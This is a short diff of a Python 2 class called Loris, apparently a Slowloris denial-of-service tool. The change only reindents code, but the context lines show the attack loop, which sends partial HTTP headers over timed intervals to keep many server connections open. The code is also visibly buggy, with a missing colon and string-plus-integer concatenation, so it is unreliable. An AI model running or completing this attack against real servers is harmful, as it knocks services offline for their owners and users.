@@ -33,10 +33,10 @@ class Loris:
     port
     """
     def initiateAttack(self):
-    	self.timeout = self.findTimeout()
-    	if self.timeout < 0:
-    		print "Something is going horribly wrong"
-    		return
+        self.timeout = self.findTimeout()
+        if self.timeout < 0:
+            print "Something is going horribly wrong"
+            return
 
         i = 0
         while i < totalConnections
@@ -67,7 +67,7 @@ class Loris:
             if sent is not len(payload):
                 return -1
         for i in range(1, self.MAX_TIMEOUT):
-        	print "Attempting a " + i + " second timeout"
+            print "Attempting a " + i + " second timeout"
             time.sleep(i)
             message = "X-a: b\r\n"
             sent = sock.send(message)
